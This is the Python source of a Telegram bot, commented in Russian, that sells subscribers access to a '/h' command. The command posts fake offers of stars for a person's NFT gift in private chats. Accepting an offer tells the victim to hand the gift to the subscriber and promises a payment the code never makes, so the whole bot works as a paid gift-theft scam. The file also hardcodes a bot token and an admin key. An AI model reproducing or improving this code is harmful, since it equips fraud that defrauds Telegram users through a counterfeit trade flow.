import asyncio
import re
import sqlite3
import datetime
import os
from pathlib import Path
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "9232358495:AAHAAXXqACqM4-RIDuS1Yxkb2PHOmVH9ZN0" 
ADMIN_ID = 8808258682 # ТВОЙ ID
SELLER_TG = "s3rp3ntcoders" 
SUPPORT_TG = "iserpentt" 
# ======================

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

class KeyState(StatesGroup):
    waiting_for_key = State()

# === ГЛАВНОЕ ИСПРАВЛЕНИЕ ДЛЯ BOTHOST ===
# Bothost сохраняет данные ТОЛЬКО в /app/data. 
# Если писать в "shop.db" рядом со скриптом — файл удалится при рестарте.
data_dir = Path(os.environ.get("DATA_DIR", "/app/data"))
try:
    data_dir.mkdir(parents=True, exist_ok=True)
    db_path = data_dir / "shop.db"
    conn = sqlite3.connect(db_path, check_same_thread=False)
    # Проверяем, что запись работает
    conn.execute("CREATE TABLE IF NOT EXISTS _test (id INTEGER)")
    conn.execute("DROP TABLE _test")
    conn.commit()
    print(f"База данных: {db_path}")
except Exception as e:
    print(f"Ошибка записи в {data_dir}: {e}. Использую локальную папку.")
    conn = sqlite3.connect("shop.db", check_same_thread=False)

cur = conn.cursor()
cur.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT DEFAULT NULL,
    full_name TEXT DEFAULT NULL,
    sub_until TEXT DEFAULT NULL,
    notify_msg TEXT DEFAULT NULL
)
""")
cur.execute("""
CREATE TABLE IF NOT EXISTS keys (
    key_code TEXT PRIMARY KEY,
    date_until TEXT
)
""")
conn.commit()

def save_user(user):
    cur.execute("""
        INSERT INTO users (user_id, username, full_name) 
        VALUES (?, ?, ?) 
        ON CONFLICT(user_id) DO UPDATE SET 
        username=excluded.username, full_name=excluded.full_name
    """, (user.id, user.username, user.full_name))
    conn.commit()

async def check_notifications():
    while True:
        try:
            cur.execute("SELECT user_id, notify_msg FROM users WHERE notify_msg IS NOT NULL")
            rows = cur.fetchall()
            for user_id, msg in rows:
                try:
                    await bot.send_message(user_id, msg)
                    cur.execute("UPDATE users SET notify_msg = NULL WHERE user_id = ?", (user_id,))
                    conn.commit()
                except: pass
        except: pass
        await asyncio.sleep(5)

def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛒 Купить", callback_data="buy")],
        [InlineKeyboardButton(text="💰 Прайсы", callback_data="prices")],
        [InlineKeyboardButton(text="📖 Туториал", callback_data="tutorial")],
        [InlineKeyboardButton(text="👤 Мой профиль", callback_data="profile")],
        [InlineKeyboardButton(text="🆘 Поддержка", url=f"https://t.me/{SUPPORT_TG}")]
    ])

def buy_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"✉️ Написать @{SELLER_TG}", url=f"https://t.me/{SELLER_TG}")],
        [InlineKeyboardButton(text="🔑 Ввести ключ", callback_data="enter_key")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
    ])

def check_sub(user_id):
    cur.execute("SELECT sub_until FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    if not row or row[0] is None: return False
    return datetime.datetime.now().strftime("%Y-%m-%d") <= row[0]

async def change_message(message: types.Message, text: str, keyboard: InlineKeyboardMarkup = None, link: str = None):
    kwargs = {}
    if keyboard: kwargs['reply_markup'] = keyboard
    if link: kwargs['link_preview_options'] = LinkPreviewOptions(url=link, prefer_large_media=True)
    try:
        await message.edit_text(text=text, **kwargs)
    except:
        try: await message.delete()
        except: pass
        await message.answer(text=text, **kwargs)

@dp.message(Command("start"))
async def start(message: types.Message):
    save_user(message.from_user)
    await message.answer("👋 Добро пожаловать в магазин!\n\nВыберите действие:", reply_markup=main_menu())

@dp.callback_query(F.data == "main_menu")
async def to_main(callback: types.CallbackQuery):
    await callback.message.edit_text("👋 Добро пожаловать в магазин!\n\nВыберите действие:", reply_markup=main_menu())

@dp.callback_query(F.data == "tutorial")
async def tutorial(callback: types.CallbackQuery):
    text = (
        "📖 <b>Как сделать оффер:</b>\n\n"
        "1. Зайдите в <b>личный чат</b> с человеком, которому хотите предложить сделку.\n"
        "2. Напишите команду:\n"
        "<code>/h [ссылка_на_нфт] [цена] [stars] [ru]</code>\n\n"
        "📌 <b>Пример:</b>\n"
        "<code>/h https://t.me/nft/CloverPin-193200 1200 stars ru</code>\n\n"
        "3. Бот удалит вашу команду и пришлет красивое предложение с кнопками."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]])
    await callback.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data == "profile")
async def profile(callback: types.CallbackQuery):
    cur.execute("SELECT sub_until FROM users WHERE user_id = ?", (callback.from_user.id,))
    row = cur.fetchone()
    if not row or not row[0] or row[0] < datetime.datetime.now().strftime("%Y-%m-%d"):
        text = "👤 <b>Ваш профиль</b>\n\n❌ У вас нет активной подписки."
    else:
        text = f"👤 <b>Ваш профиль</b>\n\n✅ Подписка активна до: <b>{row[0]}</b>"
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))

@dp.callback_query(F.data == "buy")
async def buy(callback: types.CallbackQuery):
    await callback.message.edit_text("💎 <b>Покупка ключа</b>\n\nНапишите продавцу или введите ключ.", reply_markup=buy_menu())

@dp.callback_query(F.data == "enter_key")
async def enter_key_prompt(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🔑 <b>Введите ключ</b>:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Отмена", callback_data="buy")]]))
    await state.set_state(KeyState.waiting_for_key)

@dp.message(KeyState.waiting_for_key)
async def process_key(message: types.Message, state: FSMContext):
    user_key = message.text.strip()
    await state.clear()
    save_user(message.from_user)

    if user_key == "serpentcoders" and message.from_user.id == ADMIN_ID:
        cur.execute("UPDATE users SET sub_until = '2099-12-31' WHERE user_id = ?", (message.from_user.id,))
        conn.commit()
        await message.answer("✅ Админ-код принят! Подписка навсегда.", reply_markup=main_menu())
        return

    cur.execute("SELECT date_until FROM keys WHERE key_code = ?", (user_key,))
    row = cur.fetchone()
    if not row:
        await message.answer("❌ Неверный ключ!", reply_markup=buy_menu())
        return

    cur.execute("UPDATE users SET sub_until = ? WHERE user_id = ?", (row[0], message.from_user.id))
    conn.commit()
    await message.answer(f"✅ <b>Ключ активирован!</b>\nДействует до: <b>{row[0]}</b>", reply_markup=main_menu())

@dp.callback_query(F.data == "prices")
async def prices(callback: types.CallbackQuery):
    text = "💰 <b>Прайсы:</b>\n\n▫️ 2 недели — 49 руб.\n▫️ 1 месяц — 99 руб.\n▫️ 6 месяцев — 299 руб.\n▫️ 1 год — 499 руб.\n▫️ Навсегда — 699 руб."
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"✉️ Написать @{SELLER_TG}", url=f"https://t.me/{SELLER_TG}")],[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]])
    await callback.message.edit_text(text, reply_markup=kb)

# ===== ОФФЕР =====
@dp.business_message(F.text.startswith("/h"))
async def make_offer(message: types.Message):
    save_user(message.from_user)
    if not check_sub(message.from_user.id):
        try: await message.delete()
        except: pass
        await message.answer("⛔ У вас нет подписки!")
        return

    args = message.text.split()
    if len(args) < 5: return
    link, price, lang = args[1], args[2], args[4].lower()
    
    match = re.search(r'/nft/([^-]+)-(\d+)', link)
    gift_name = f"{match.group(1)} #{match.group(2)}" if match else "Collectible"

    sender_name = message.from_user.first_name
    sender_username = message.from_user.username or str(message.from_user.id)

    if lang == "ru":
        text = f"Пользователь @{sender_username} ({sender_name}) предлагает вам {price} ⭐ за подарок {gift_name}."
        btn_accept, btn_decline = "Принять", "Отклонить"
    else:
        text = f"User @{sender_username} ({sender_name}) offers you {price} ⭐ for the gift {gift_name}."
        btn_accept, btn_decline = "Accept", "Decline"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=f"✅ {btn_accept}", callback_data=f"accept_{price}_{gift_name}_{sender_username}"),
        InlineKeyboardButton(text=f"❌ {btn_decline}", callback_data="decline_offer")
    ]])
    
    try: await message.edit_text(text=text, reply_markup=keyboard, link_preview_options=LinkPreviewOptions(url=link, prefer_large_media=True))
    except:
        try: await message.delete()
        except: pass
        await message.answer(text=text, reply_markup=keyboard, link_preview_options=LinkPreviewOptions(url=link, prefer_large_media=True))

@dp.callback_query(F.data.startswith("accept_"))
async def accept(callback: types.CallbackQuery):
    parts = callback.data.split("_", 3)
    price, gift_name, sender_username = parts[1], parts[2], parts[3]
    await callback.answer()

    text_accepted = (
        f"✅ <b>Предложение принято!</b>\n\n"
        f"Нажмите «📤 Отправить», передайте {gift_name} пользователю @{sender_username}.\n\n"
        f"После передачи на ваш баланс поступит {price} ⭐."
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Отправить", url=f"https://t.me/{sender_username}")],
        [InlineKeyboardButton(text="✅ Я отправил", callback_data=f"sent_{price}_{gift_name}_{sender_username}")]
    ])
    
    await change_message(callback.message, text_accepted, keyboard)

@dp.callback_query(F.data.startswith("sent_"))
async def sent_gift(callback: types.CallbackQuery):
    parts = callback.data.split("_", 3)
    price, gift_name, sender_username = parts[1], parts[2], parts[3]
    buyer_id = callback.from_user.id
    buyer_username = callback.from_user.username or str(buyer_id)

    await callback.answer()
    await change_message(callback.message, "⏳ <b>Ожидайте подтверждения от продавца...</b>")
    
    admin_text = (
        f"🔔 <b>Покупатель утверждает, что отправил подарок!</b>\n\n"
        f"Покупатель: @{buyer_username} (ID: <code>{buyer_id}</code>)\n"
        f"Продавец: @{sender_username}\n"
        f"Подарок: {gift_name}\n"
        f"Цена: {price} ⭐\n\n"
        f"Проверьте свой профиль. Если подарок есть — подтвердите сделку."
    )
    
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"approve_{buyer_id}")],
        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{buyer_id}")]
    ])
    
    try:
        await bot.send_message(ADMIN_ID, admin_text, reply_markup=admin_kb)
    except Exception as e:
        print("Ошибка уведомления админу:", e)

@dp.callback_query(F.data.startswith("approve_"))
async def approve_gift(callback: types.CallbackQuery):
    buyer_id = int(callback.data.split("_")[1])
    await callback.answer("Подтверждено!")
    await callback.message.edit_text(f"✅ Вы подтвердили сделку для ID {buyer_id}.")
    try: await bot.send_message(buyer_id, "✅ <b>Продавец подтвердил получение подарка!</b>\n\nСделка успешно завершена.")
    except: pass

@dp.callback_query(F.data.startswith("reject_"))
async def reject_gift(callback: types.CallbackQuery):
    buyer_id = int(callback.data.split("_")[1])
    await callback.answer("Отклонено!")
    await callback.message.edit_text(f"❌ Вы отклонили сделку для ID {buyer_id}.")
    try: await bot.send_message(buyer_id, "❌ <b>Продавец не получил подарок.</b>\n\nСделка отменена. Если вы отправили подарок, свяжитесь с поддержкой.")
    except: pass

@dp.callback_query(F.data == "decline_offer")
async def decline(callback: types.CallbackQuery):
    await callback.answer()
    await change_message(callback.message, "❌ <b>Оффер отклонен.</b>")

async def main():
    print("Бот запущен.")
    asyncio.create_task(check_notifications())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
